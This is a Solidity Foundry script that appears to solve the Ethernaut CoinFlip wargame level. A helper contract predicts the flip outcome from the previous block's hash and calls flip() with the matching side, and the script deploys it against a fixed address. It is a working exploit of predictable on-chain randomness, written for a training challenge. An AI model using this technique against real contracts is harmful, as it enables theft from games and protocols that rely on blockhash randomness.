// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/EthernautCoinFlip.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract Player {
    uint256 blockValue;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlip) {
        blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipNumber = blockValue / FACTOR;
        bool side = coinFlipNumber == 1 ? true : false;
        _coinFlip.flip(side);
    }
}

contract CoinFlipSolution is Script {
    CoinFlip public coinFlip =
        CoinFlip(0x42d65A8681EC5b5F39448E237b2F1fB4dCCFac6f);
    Player player;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        player = new Player(coinFlip);
        console.log("Current consecutive wins: ", coinFlip.consecutiveWins());
        vm.stopBroadcast();
    }
}
